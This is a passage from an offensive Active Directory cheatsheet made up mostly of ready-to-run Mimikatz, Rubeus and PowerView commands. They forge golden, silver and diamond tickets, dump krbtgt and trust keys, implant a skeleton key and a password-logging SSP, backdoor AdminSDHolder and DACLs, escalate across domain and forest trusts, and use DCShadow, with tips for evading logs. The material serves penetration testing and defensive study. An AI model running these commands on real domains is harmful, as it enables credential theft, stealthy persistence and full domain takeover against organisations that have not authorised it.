<pre id="bkmrk-.%5Crubeus.exe-diamond"><code class="language-powershell">.\Rubeus.exe diamond /krbkey:&lt;aes_krbtgt_key&gt; /user:user1 /password:password /enctype:aes /domain:domain.local /dc:dc.domain.local /ticketuser:Administrator /ticketuserid:&lt;target_RID&gt; /groups:512 /nowrap
</code></pre>
<p id="bkmrk-for-better-opsec%2C-th">For better opsec, the Shapphire Ticket presented in the Active Directory - Python edition cheatsheet can be used.</p>
<h3 id="bkmrk-golden-ticket">Golden ticket</h3>
<h4 id="bkmrk-retrieve-the-krbtgt-">Retrieve the krbtgt hash</h4>
<ul id="bkmrk-from-the-dc-by-dumpi"><li>From the DC by dumping LSA</li>
</ul><pre id="bkmrk-invoke-mimikatz--com-7"><code class="language-powershell">Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dc
</code></pre>
<ul id="bkmrk-with-a-dcsync"><li>With a DCSync</li>
</ul><pre id="bkmrk-invoke-mimikatz--com-8"><code class="language-powershell">Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
</code></pre>
<h4 id="bkmrk-create-tgt">Create TGT</h4>
<pre id="bkmrk-invoke-mimikatz--com-9"><code class="language-powershell">Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:&lt;domain_SID&gt; /krbtgt:&lt;krbtgt_hash&gt; /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
</code></pre>
<h4 id="bkmrk-rodc-golden-ticket">RODC Golden Ticket</h4>
<p id="bkmrk-in-case-of-a-rodc%2C-i">In case of a RODC, it is still possible to forge a Golden Ticket but the KRBTGT's version number is needed and only the accounts allowed to authenticate can be specified in the ticket (according to the <code>msDS-RevealOnDemandGroup</code> and <code>msDS-NeverRevealGroup</code> lists).</p>
<pre id="bkmrk-.%5Crubeus.exe-golden-"><code class="language-powershell">.\Rubeus.exe golden /rodcNumber:&lt;krbtgt_number&gt; /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:&lt;krbtgt_aes_key&gt; /user:user1 /id:&lt;user_RID&gt; /domain:domain.local /sid:&lt;domain_SID&gt;
</code></pre>
<h3 id="bkmrk-silver-ticket">Silver ticket</h3>
<h4 id="bkmrk-create-st">Create ST</h4>
<p id="bkmrk-%2Frc4-take-the-servic"><code>/rc4</code> take the service account (generally the machine account) hash. <code>/aes128</code> or <code>/aes256</code> can be used for AES keys.</p>
<pre id="bkmrk-invoke-mimikatz--com-10"><code class="language-powershell">Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:&lt;domain_SID&gt; /target:&lt;target&gt;.domain.local /service:CIFS /rc4:&lt;account_hash&gt; /ptt"'
</code></pre>
<p id="bkmrk-requesting-a-st-with">Requesting a ST with a valid TGT can be performed with <strong>Rubeus</strong> like this:</p>
<pre id="bkmrk-.%5Crubeus.exe-asktgs--0"><code class="language-powershell">.\Rubeus.exe asktgs /ticket:tgt.kirbi /service:LDAP/dc.domain.local,cifs/dc.domain.local /ptt
</code></pre>
<p id="bkmrk-another-solution%2C-if">Another solution, if you don't have the NT hash or the AES keys of the service but you have a TGT for the service account, is to impersonate an account via a request for a service ticket through S4USelf to an alternative service (and the opsec is better since the PAC is consistent):</p>
<pre id="bkmrk-.%5Crubeus.exe-s4u-%2Fse-0"><code class="language-powershell">.\Rubeus.exe s4u /self /impersonateuser:"Administrator" /altservice:"cifs/target.domain.local" /ticket:"&lt;base64_target_TGT&gt;" /nowrap
</code></pre>
<h3 id="bkmrk-goldengmsa">GoldenGMSA</h3>
<p id="bkmrk-with-the-kds-root-ke">With the KDS root key and some information about the gMSA account (that can be retrieved with low privileges), it is possible to compute the gMSA's password.</p>
<h4 id="bkmrk-dump-the-kds-root-ke">Dump the KDS root key</h4>
<p id="bkmrk-this-operation-needs">This operation needs admin privs on the domain</p>
<pre id="bkmrk-%23for-the-root-domain"><code class="language-powershell">#For the root domain of the forest
./GoldenGMSA.exe kdsinfo

#For a specific domain
./GoldenGMSA.exe kdsinfo --forest domain.local
</code></pre>
<h4 id="bkmrk-retrieve-gmsa%27s-info">Retrieve gMSA's information</h4>
<p id="bkmrk-low-privs-are-suffic">Low privs are sufficient here</p>
<pre id="bkmrk-%23all-the-gmsa-accoun"><code class="language-powershell">#All the gMSA accounts
./GoldenGMSA.exe gmsainfo

#A specific one in a specific domain
./GoldenGMSA.exe gmsainfo --sid &lt;gmsa_SID&gt; --domain domain.local
</code></pre>
<h4 id="bkmrk-compute-the-password">Compute the password</h4>
<p id="bkmrk-this-operation-can-b">This operation can be realized offline</p>
<pre id="bkmrk-.%2Fgoldengmsa.exe-com"><code class="language-powershell">./GoldenGMSA.exe compute --sid &lt;gmsa_SID&gt; --kdskey &lt;base64_KDS_key&gt; --pwdid &lt;base64_msds-ManagedPasswordID_value&gt;
</code></pre>
<p id="bkmrk-the-output-is-in-bas">The output is in Base64 and the password is generally not readable. It is possible to calcul the NT hash from it instead:</p>
<pre id="bkmrk-import-base64-import"><code class="language-python">import base64
import hashlib

b64 = "&lt;base64_password&gt;"
print(hashlib.new("md4", base64.b64decode(b64)).hexdigest())
</code></pre>
<h3 id="bkmrk-skeleton-key">Skeleton key</h3>
<pre id="bkmrk-invoke-mimikatz--com-11"><code class="language-powershell">Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc.domain.local
</code></pre>
<p id="bkmrk-now%2C-it-is-possible-">Now, it is possible to access any machine with a valid username and password as "mimikatz".</p>
<pre id="bkmrk-enter-pssession--com"><code class="language-powershell">Enter-PSSession -Computername dc -Credential domain\Administrator
</code></pre>
<h3 id="bkmrk-dsrm">DSRM</h3>
<ul id="bkmrk-dsrm-is-directory-se"><li>DSRM is Directory Services Restore Mode</li>
<li>The local administrator on every DC can authenticate with the DSRM password</li>
<li>It is possible to pass the hash of this user to access the DC after modifying the DC configuration</li>
</ul><h4 id="bkmrk-dump-dsrm-password">Dump DSRM password</h4>
<pre id="bkmrk-invoke-mimikatz--com-12"><code class="language-powershell">Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dc
</code></pre>
<h4 id="bkmrk-change-registry-conf">Change registry configuration</h4>
<p id="bkmrk-need-to-change-the-l">Need to change the logon behavior before pass the hash</p>
<pre id="bkmrk-enter-pssession--com-0"><code class="language-powershell">Enter-PSSession -Computername dc
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
</code></pre>
<p id="bkmrk-now-the-dsrm-hash-ca">Now the DSRM hash ca be used to authenticate</p>
<h3 id="bkmrk-custom-ssp">Custom SSP</h3>
<p id="bkmrk-ssp-are-ddls-that-pr">SSP are DDLs that provide ways to authenticate for the application. For example Kerberos, NTLM, WDigest, etc. Mimikatz provides a custom SSP that permits to log in a file in clear text the passwords of the users that authenticate on the machine.</p>
<ul id="bkmrk-by-patching-lsass-%28r"><li>By patching LSASS (really instable since Server 2016)</li>
</ul><pre id="bkmrk-invoke-mimikatz--com-13"><code class="language-powershell">Invoke-Mimikatz -Command '"misc::memssp"'
</code></pre>
<ul id="bkmrk-by-modifying-the-lsa"><li>By modifying the LSA registry</li>
</ul><p id="bkmrk-upload-the-mimilib.d">Upload the <code>mimilib.dll</code> to <strong>system32</strong> and add mimilib to <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> :</p>
<pre id="bkmrk-%24packages-%3D-get-item"><code class="language-powershell">$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'
$packages += "mimilib"
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
</code></pre>
<p id="bkmrk-all-local-logons-on-">All local logons on the DC are logged to <code>C:\Windows\system32\kiwissp.log</code></p>
<h3 id="bkmrk-dacls---adminsdholde">DACLs - AdminSDHolder</h3>
<p id="bkmrk-adminsdholder-is-a-s">AdminSDHolder is a solution that compares the ACLS of the objects with <code>AdminCount=1</code> with a list of ACLs. If the ACLs of the objects are different, they are overwritten. The script run normally every hour.</p>
<h4 id="bkmrk-attack">Attack</h4>
<ul id="bkmrk-with-write-privs-on-"><li>With write privs on the AdminSDHolder object, it can be used for persistence by adding a user with Full Permissions to the AdminSDHolder object for example.</li>
<li>When the automatic script will run, the user will be added with Full Control to the AC of groups like Domain Admins.</li>
</ul><pre id="bkmrk-%23powerview-add-objec"><code class="language-powershell">#PowerView
Add-ObjectAcl -TargetSearchBase 'CN=AdminSDHolder,CN=System' -PrincipalIdentity user1 -Rights All -Verbose

#AD Module
Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -Principal user1 -Verbose
</code></pre>
<h4 id="bkmrk-run-sdprop-manually">Run SDProp manually</h4>
<pre id="bkmrk-invoke-sdpropagator-"><code class="language-powershell">Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
#Pre-Server 2008
Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
</code></pre>
<h4 id="bkmrk-check-domain-admins-">Check Domain Admins DACLs</h4>
<pre id="bkmrk-%23powerview-get-objec"><code class="language-powershell">#PowerView
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'user1'}

#AD Module
(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=domain,DC=local').Access | ?{$_.IdentityReference -match 'user1'}
</code></pre>
<h3 id="bkmrk-dacls---interesting-">DACLs - Interesting rights</h3>
<p id="bkmrk-the-acls-can-be-used">The ACLs can be used for persistence purpose by adding interesting rights like DCSync, FullControl over the domain, etc. Check the <code>On any objects</code> in the ACLs attacks section. Multiple rights like <strong>All</strong>, <strong>DCSync</strong>, etc, are possible.</p>
<h3 id="bkmrk-dacls---security-dec">DACLs - Security Decriptors</h3>
<p id="bkmrk-acls-can-be-modified">ACLs can be modified to allow users to access objects.</p>
<h4 id="bkmrk-wmi">WMI</h4>
<pre id="bkmrk-%23on-local-machine-se"><code class="language-powershell">#On local machine
Set-RemoteWMI -UserName user1 -Verbose

#On remote machine without explicit credentials
Set-RemoteWMI -UserName user1 -ComputerName &lt;computer&gt; -namespace 'root\cimv2' -Verbose

#On remote machine with explicit credentials. Only root\cimv2 and nested namespaces
Set-RemoteWMI -UserName user1 -ComputerName &lt;computer&gt; -Credential Administrator -namespace 'root\cimv2' -Verbose

#On remote machine remove permissions
Set-RemoteWMI -UserName user1 -ComputerName &lt;computer&gt; -namespace 'root\cimv2' -Remove -Verbose
</code></pre>
<h4 id="bkmrk-powershell-remoting-0">PowerShell Remoting</h4>
<pre id="bkmrk-%23on-local-machine-se-0"><code class="language-powershell">#On local machine
Set-RemotePSRemoting -UserName user1 -Verbose

#On remote machine without credentials
Set-RemotePSRemoting -UserName user1 -ComputerName &lt;computer&gt; -Verbose

#On remote machine, remove the permissions
Set-RemotePSRemoting -UserName user1 -ComputerName &lt;computer&gt; -Remove
</code></pre>
<h4 id="bkmrk-remote-registry">Remote Registry</h4>
<p id="bkmrk-with-the-scripts-fro">With the scripts from <strong>DAMP-master</strong>. Permits to realize some actions like credentials dump via the registry.</p>
<h2 id="bkmrk-cross-trust-movement">Cross-Trust Movement</h2>
<h3 id="bkmrk-child-to-parent-doma">Child to parent domain</h3>
<p id="bkmrk-escalate-from-a-chil">Escalate from a child domain to the root domain of the forest by forging a Golden Ticket with the SID of the <strong>Enterprise Admins</strong> group in the SID history field.</p>
<h4 id="bkmrk-with-the-trust-key">With the trust key</h4>
<p id="bkmrk-get-the-trust-key%2C-l">Get the trust key, look at the <code>[in]</code> value in the result</p>
<pre id="bkmrk-invoke-mimikatz--com-14"><code class="language-powershell">Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc
#OR
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\parentDomain$"'
</code></pre>
<p id="bkmrk-forge-the-referral-t">Forge the referral ticket :</p>
<pre id="bkmrk-invoke-mimikatz--com-15"><code class="language-powershell">Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:&lt;current_domain_SID&gt; /sids:&lt;enterprise_admins_SID&gt;-&lt;RID&gt; /rc4:&lt;key&gt; /service:krbtgt /target:parentDomain.local /ticket:trust.kirbi"'
</code></pre>
<p id="bkmrk-request-a-st-with-th">Request a ST with the previous TGT and access service :</p>
<pre id="bkmrk-%23new-tools-for-more-"><code class="language-powershell">#New tools for more fun
.\asktgs.exe trust.kirbi CIFS/dc.parentDomain.local
.\kirbikator.exe lsa .\CIFS.dc.parentDomain.local.kirbi
ls \\dc.parentDomain.local\c$

#Or classicaly
.\Rubeus.exe asktgs /ticket:trust.kirbi /service:cifs/dc.parentDomain.local /dc:dc.parentDomain.local /ptt
ls \\dc.parentDomain.local\c$
</code></pre>
<h4 id="bkmrk-with-the-krbtgt-hash">With the krbtgt hash</h4>
<p id="bkmrk-exactly-the-same-att">Exactly the same attack, but with the krbtgt hash that can be extracted like this :</p>
<pre id="bkmrk-invoke-mimikatz--com-16"><code class="language-powershell">Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
</code></pre>
<p id="bkmrk-to-avoid-some-suspic">To avoid some suspicious logs, use multiple values can be added in SID History :</p>
<pre id="bkmrk-invoke-mimikatz--com-17"><code class="language-powershell">Invoke-Mimikatz -Command '"kerberos::golden /user:dc$ /domain:domain.local /sid:&lt;current_domain_SID&gt; /groups:516 /sids:&lt;parent_domain_SID&gt;-516,S-1-5-9 /krbtgt:&lt;krbtgt_hash&gt; /ptt"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:parentDomain\Administrator /domain:parentDomain.local"' 
</code></pre>
<ul id="bkmrk-%3Cparent_domain_sid%3E-"><li>
<code>&lt;parent_domain_SID&gt;-516</code> – Domain Controllers</li>
<li>
<code>S-1-5-9</code> – Enterprise Domain Controllers</li>
</ul><h3 id="bkmrk-across-forest">Across forest</h3>
<h4 id="bkmrk-sid-history-attacks">SID History attacks</h4>
<p id="bkmrk-if-there-is-no-sid-f">If there is no SID filtering, it is possible to specify any privileged SID of the target forest in the SID History field. Otherwise, with partial filtering, an <strong>RID &gt; 1000</strong> must be indicated.</p>
<ul id="bkmrk-get-the-trust-key"><li>Get the Trust Key</li>
</ul><pre id="bkmrk-invoke-mimikatz--com-18"><code class="language-powershell">Invoke-Mimikatz -Command '"lsadump::trust /patch"'
#Or
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
</code></pre>
<ul id="bkmrk-if-no-filtering-%3A-fo"><li>If <strong>no filtering</strong> : forge a referral ticket or an inter-realm Golden Ticket and request for a ST</li>
</ul><pre id="bkmrk-%23referral-ticket-wit"><code class="language-powershell">#Referral ticket with the Trust Key
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:&lt;current_domain_SID&gt; /sids:&lt;target_domain_SID&gt;-&lt;RID&gt; /rc4:&lt;key&gt; /service:krbtgt /target:targetDomain.local /ticket:trust_forest.kirbi"'

#Inter-realm Golden Ticket with krbtgt, with pass-the-ticket
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:&lt;current_domain_SID&gt; /sids:&lt;target_domain_SID&gt;-&lt;RID&gt; /krbtgt:&lt;krbtgt_hash&gt; /ptt"'

#For a specific user different than the Administrator (not RID 500)
Invoke-Mimikatz -Command '"kerberos::golden /user:user1 /domain:domain.local /sid:&lt;current_domain_SID&gt; /id:&lt;user1_RID&gt; /rc4:&lt;trust_key&gt; /service:krbtgt /target:targetDomain.local /ticket:trust_forest.kirbi"'

./Rubeus.exe asktgs /ticket:trust_forest.kirbi /service:cifs/dc.targetDomain.local /dc:dc.targetDomain.local /ptt
</code></pre>
<ul id="bkmrk-if-there-is-sid-filt"><li>If <strong>there is SID filtering</strong>, same thing as above but with <strong>RID &gt; 1000</strong> (for example, Exchange related groups are sometimes highly privileged, and always with a RID &gt; 1000). Otherwise, get the <code>foreignSecurityPrincipal</code>. These users of the current domain are also members of the trusting forest, and they can be members of interesting groups:</li>
</ul><pre id="bkmrk-%23these-sids-are-memb"><code class="language-powershell">#These SIDs are members of the target domain
Get-DomainObject -Domain targetDomain.local | ? {$_.objectclass -match "foreignSecurityPrincipal"}

#The found SIDs can be search in the current forest
Get-DomainObject |? {$_.objectSid -match "&lt;SID&gt;"}
</code></pre>
<p id="bkmrk-then%2C-it-is-possible">Then, it is possible to forge an referral ticket for this user and access the target forest with its privileges.</p>
<h4 id="bkmrk-tgt-delegation">TGT delegation</h4>
<p id="bkmrk-by-default%2C-domain-c">By default, Domain Controllers are setup with Unconstrained Delegation (which is necessary in an Active Directory to correctly handle the Kerberos authentications).</p>
<p id="bkmrk-if-tgt-delegation-is">If TGT delegation is <strong>enabled</strong> in the trust attributes, it is possible to coerce the remote Domain Controller authentication from the compromised Domain Controller, and retrieve its TGT in the ST. If TGT delegation is <strong>disabled</strong>, the TGT will not be added in the ST, even with the Unconstrained Delegation.</p>
<p id="bkmrk-additionally%2C-select">Additionally, <strong>Selective Authentication must not be enabled</strong> on the trust, and a two ways trust is needed.</p>
<p id="bkmrk-how-to-exploit-an-un">How to exploit an <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-unconstrained-delega-0">Unconstrained Delegation</a>.</p>
<h4 id="bkmrk-transit-across-non-t">Transit across non-transitive trusts</h4>
<p id="bkmrk-if-a-non-transitive-">If a <strong>non-transitive</strong> trust is setup between domains from two different forests (domain A and B for example), users from domain A will be able to access resources in domain B (in case that B trusts A), but will not be able to access resources in other domains that trust domain B (for example, domain C). Non-transitive trusts are setup by default on <strong>External Trusts</strong> for example.</p>
<p id="bkmrk-however%2C-there-is-a-">However, there is a way to make non-transitive trusts transitive. Full explains <a href="https://exploit.ph/external-trusts-are-evil.html">here</a>.</p>
<p id="bkmrk-for-this-example%2C-th">For this example, there is an <strong>External Trust</strong> between domains A and B (which are in different forests), there is a <strong>Within Forest</strong> trust between domains B and C (which are in the same forest), and a <strong>Parent-child</strong> trust between domains C and D (so, they are in the same forest). We have a user (userA) in domain A, and we want to access services in domain D, which is normally impossible since <strong>External Trusts</strong> are non-transitive.</p>
<ul id="bkmrk-first%2C-obtain-a-tgt-"><li>First, obtain a TGT for userA in his <strong>domain A</strong>
</li>
</ul><pre id="bkmrk-.%2Frubeus.exe-asktgt--0"><code class="language-powershell">./Rubeus.exe asktgt /user:userA /password:password /nowrap
</code></pre>
<ul id="bkmrk-then%2C-request-a-refe"><li>Then, request a referral for the <strong>domain B</strong> with the previously obtained TGT (for the moment, everything is normal). This referral can be used to access resources in <strong>domain B</strong> as userA</li>
</ul><pre id="bkmrk-.%2Frubeus.exe-asktgs--1"><code class="language-powershell">./Rubeus.exe asktgs /service:krbtgt/domainB.local /ticket:&lt;previous_TGT&gt; /dc:dc.domainA.local /nowrap
</code></pre>
<ul id="bkmrk-with-this-referral%2C-"><li>With this referral, it is not possible to request for a ST in <strong>domain C</strong> since there is no transitivity. However, it is possible to use it to ask for a "local" TGT in domain B for userA. This will be a valid TGT in domain B and not a referral between A and B</li>
</ul><pre id="bkmrk-.%2Frubeus.exe-asktgs--2"><code class="language-powershell">./Rubeus.exe asktgs /service:krbtgt/domainB.local /targetdomain:domainB.local /ticket:&lt;previous_referral&gt; /dc:dc.domainB.local /nowrap
</code></pre>
<ul id="bkmrk-now%2C-this-tgt-can-be"><li>Now, this TGT can be reused to ask for a referral to access <strong>domain C</strong>, still from <strong>domain A with user A</strong>
</li>
</ul><pre id="bkmrk-.%2Frubeus.exe-asktgs--3"><code class="language-powershell">./Rubeus.exe asktgs /service:krbtgt/domainC.local /targetdomain:domainB.local /ticket:&lt;previous_local_TGT&gt; /dc:dc.domainB.local /nowrap
</code></pre>
<p id="bkmrk-this-referral-for-do">This referral for <strong>domain C</strong> can be, in turn, used to access <strong>domain D</strong> with the same technique, and so on. This attack permits to pivot between all the trusts (and consequently the domains) in the same forest from a domain in a external forest.</p>
<p id="bkmrk-however%2C-it-is-not-p">However, it is not possible to directly use this technique to access a domain in another forest that would have a trust with <strong>domain D</strong>. For example, if <strong>domain D</strong> has an <strong>External Trust</strong> with <strong>domain E</strong> in a third forest, it will be not possible to access domain E from A.</p>
<p id="bkmrk-a-valid-workaround-i">A valid workaround is to use the referral for domain D to request a ST for LDAP in domain D, and use it to create a machine account. This account will be valid in domain D and will be used to restart the attack from domain D (like with user A) and access domain E.</p>
<pre id="bkmrk-.%2Frubeus.exe-asktgs--4"><code class="language-powershell">./Rubeus.exe asktgs /service:ldap/domainD.local /ticket:&lt;referral_domainD&gt; /dc:dc.domainD.local /ptt
New-MachineAccount -MachineAccount machineDomainD -Domain domainD.local -DomainController dc.domainD.local
#Then, ask for a TGT and replay the attack against domain E
</code></pre>
<h3 id="bkmrk-across-forest---pam-">Across forest - PAM trust</h3>
<p id="bkmrk-the-goal-is-to-compr">The goal is to compromise the <strong>bastion</strong> forest and pivot to the <strong>production</strong> forest to access to all the resources with a <strong>Shadow Security Principal</strong> mapped to a high priv group.</p>
<h4 id="bkmrk-check-if-the-current">Check if the current forest is a bastion forest</h4>
<ul id="bkmrk-enumerate-trust-prop"><li>Enumerate trust properties</li>
</ul><pre id="bkmrk-get-adtrust--filter-"><code class="language-powershell">Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
</code></pre>
<ul id="bkmrk-enumerate-shadow-sec"><li>Enumerate shadow security principals</li>
</ul><pre id="bkmrk-get-adobject--search"><code class="language-powershell">Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) | select Name,member,msDS-ShadowPrincipalSid | fl
</code></pre>
<ul id="bkmrk-name---name-of-the-s"><li>
<code>Name</code> - Name of the shadow principal</li>
<li>
<code>member</code> - Members from the bastion forest which are mapped to the shadow principal</li>
<li>
<code>msDS-ShadowPrincipalSid</code> - The SID of the principal (user or group) in the user/production forest whose privileges are assgined to the shadow security principal. In our example, it is the Enterpise Admins group in the user forest</li>
</ul><p id="bkmrk-these-users-can-acce">These users can access the production forest through the trust with classic workflow (PSRemoting, RDP, etc), or with <code>SIDHistory</code> injection since <code>SIDFiltering</code> is disabled in a <strong>PAM Trust</strong>.</p>
<h4 id="bkmrk-check-if-the-current-0">Check if the current forest is managed by a bastion forest</h4>
<pre id="bkmrk-get-adtrust--filter--0"><code class="language-powershell">Get-ADTrust -Filter {(ForestTransitive -eq $True)}
</code></pre>
<p id="bkmrk-a-trust-attribute-of">A trust attribute of <code>1096</code> is for PAM (<code>0x00000400</code>) + External Trust (<code>0x00000040</code>) + Forest Transitive (<code>0x00000008</code>).</p>
<h3 id="bkmrk-sccm-hierarchy-takeo">SCCM Hierarchy takeover</h3>
<p id="bkmrk-in-case-an-organisat">In case an organisation has multiple SCCM primary sites dispersed between different domains, it has the possibility to setup a <strong>Central Administration Site</strong> to administrate all the sites from one "top" site server.</p>
<p id="bkmrk-if-it-the-case%2C-by-d">If it the case, by default the CAS will automatically replicate all the SCCM site admins between all the sites. This means, if you have takeover one site and added a controlled user as SCCM site admin, he will be automatically added as a site admin on all the other site by the CAS, and you can use him to pivote between the sites.</p>
<p id="bkmrk-full-explains-here.">Full explains <a href="https://medium.com/specter-ops-posts/sccm-hierarchy-takeover-41929c61e087">here</a>.</p>
<h3 id="bkmrk-mssql-server">MSSQL server</h3>
<p id="bkmrk-everything-is-here.-">Everything is here. (<em>Not for the moment, refactor in progress</em>)</p>
<h2 id="bkmrk-forest-persistence--">Forest Persistence - DCShadow</h2>
<ul id="bkmrk-dcshadow-permits-to-"><li>DCShadow permits to create a rogue Domain Controller on a standard computer in the AD. This permits to modify objects in the AD without leaving any logs on the real Domain Controller</li>
<li>The compromised machine must be in the <strong>root domain</strong> on the forest, and the command must be executed as DA (or similar)</li>
</ul><p id="bkmrk-the-attack-needs-2-i">The attack needs 2 instances on the compromised machine and <strong>Mimikatz</strong>.</p>
<ul id="bkmrk-one-to-start-rpc-ser"><li>One to start RPC servers with SYSTEM privileges and specify attributes to be modified</li>
</ul><pre id="bkmrk-%23with-mimikatz-%23set-"><code class="language-batch">#With Mimikatz
#Set SYSTEM privs to the process
!+
!processtoken
#Launch the server
lsadump::dcshadow /object:&lt;object_to_modify&gt; /attribute:&lt;attribute_to_modify&gt; /value=&lt;value_to_set&gt;
</code></pre>
<ul id="bkmrk-and-second-with-enou"><li>And second with enough privileges (DA or otherwise) to push the values :</li>
</ul><pre id="bkmrk-sekurlsa%3A%3Apth-%2Fuser%3A"><code class="language-batch">sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:&lt;hash&gt; /impersonate
lsadump::dcshadow /push
</code></pre>
<h3 id="bkmrk-minimal-permissions">Minimal permissions</h3>
<p id="bkmrk-dcshadow-can-be-used">DCShadow can be used with <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcshadow#dcshadow">minimal permissions</a> (and <a href="http://www.labofapenetrationtester.com/2018/04/dcshadow.html">this</a>) by modifying ACLs of :</p>
<ul id="bkmrk-the-domain-object.-d"><li>The domain object.
<ul><li>DS-Install-Replica (Add/Remove Replica in Domain)</li>
<li>DS-Replication-Manage-Topology (Manage Replication Topology)</li>
<li>DS-Replication-Synchronize (Replication Synchornization)</li>
</ul></li>
<li>The Sites object (and its children) in the Configuration container.
<ul><li>CreateChild and DeleteChild</li>
</ul></li>
<li>The object of the computer which is registered as a DC.
<ul><li>WriteProperty (Not Write)</li>
</ul></li>
<li>The target object.
<ul><li>WriteProperty (Not Write)</li>
</ul></li>
</ul><p id="bkmrk-set-dcshadowpermissi"><code>Set-DCShadowPermissions</code> can be used to setup automatically</p>
<p id="bkmrk-to-use-dcshadow-as-u">To use DCShadow as user <strong>user1</strong> to modify <strong>user2</strong> object from machine <strong>machine-user1</strong></p>
<pre id="bkmrk-set-dcshadowpermissi-0"><code class="language-powershell">Set-DCShadowPermissions -FakeDC machine-user1 -SAMAccountName user2 -Username user1 -Verbose
</code></pre>
<p id="bkmrk-now%2C-the-second-mimk">Now, the <strong>second mimkatz</strong> instance (which runs as DA) is not required.</p>
<h3 id="bkmrk-set-interesting-attr">Set interesting attributes</h3>
<h4 id="bkmrk-set-sidhistory-to-en">Set SIDHistory to Enterprise Admin</h4>
<pre id="bkmrk-lsadump%3A%3Adcshadow-%2Fo"><code class="language-batch">lsadump::dcshadow /object:user1 /attribute:SIDHistory /value:&lt;domain_SID&gt;-519
</code></pre>
<h4 id="bkmrk-modify-primarygroupi">Modify primaryGroupID</h4>
<pre id="bkmrk-lsadump%3A%3Adcshadow-%2Fo-0"><code class="language-batch">lsadump::dcshadow /object:user1 /attribute:primaryGroupID /value:519
</code></pre>
<h4 id="bkmrk-modify-ntsecuritydes">Modify ntSecurityDescriptor for AdminSDHolder to add Full Control for a user</h4>
<p id="bkmrk-we-just-need-to-appe">We just need to append a Full Control ACE from above for SY/BA/DA with our user's SID at the end.</p>
<pre id="bkmrk-%23read-the-current-ac"><code class="language-powershell">#Read the current ACL of high priv groups
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=domain,DC=local")).psbase.ObjectSecurity.sddl
</code></pre>
<p id="bkmrk-get-the-sid-of-our-u">Get the SID of our user and append it at the end of the ACLs. Then launch DCShadow like this :</p>
<pre id="bkmrk-lsadump%3A%3Adcshadow-%2Fo-1"><code class="language-batch">lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=domain,DC=local /attribute:ntSecurityDescriptor /value:&lt;modified ACL&gt;
</code></pre>
<h4 id="bkmrk-set-a-spn-on-an-user">Set a SPN on an user</h4>
<pre id="bkmrk-lsadump%3A%3Adcshadow-%2Fo-2"><code class="language-batch">lsadump::dcshadow /object:user1 /attribute:servicePrincipalName /value:"Legitime/User1"
</code></pre>
<h3 id="bkmrk-shadowception">Shadowception</h3>
<p id="bkmrk-we-can-even-run-dcsh">We can even run DCShadow from DCShadow, which is <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcshadow#shadowception-give-dcshadow-permissions-using-dcshadow-no-modified-permissions-logs"><em>Shadowception</em></a> (and <a href="http://www.labofapenetrationtester.com/2018/04/dcshadow.html">still this</a>).</p>
<p id="bkmrk-we-need-to-append-fo">We need to append following ACEs with our user's SID at the end:</p>
<ul id="bkmrk-on-the-domain-object"><li>On the domain object: <code>(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)</code><br><code>(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)</code><br><code>(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)</code>
</li>
<li>On the attacker computer object: <code>(A;;WP;;;UserSID)</code>
</li>
<li>On the target user object: <code>(A;;WP;;;UserSID)</code>
</li>
<li>On the Sites object in Configuration container: <code>(A;CI;CCDC;;;UserSID)</code>
</li>
</ul><h4 id="bkmrk-get-the-acls">Get the ACLs</h4>
<p id="bkmrk-get-the-acls-for-the">Get the ACLs for the Domain Object :</p>
<pre id="bkmrk-%28new-object-system.d"><code class="language-powershell">(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=domain,DC=local")).psbase.ObjectSecurity.sddl
</code></pre>
<p id="bkmrk-for-the-attacker-mac">For the attacker machine :</p>
<pre id="bkmrk-%28new-object-system.d-0"><code class="language-powershell">(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=machine-user1,CN=Computers,DC=domain,DC=local")).psbase.ObjectSecurity.sddl
</code></pre>
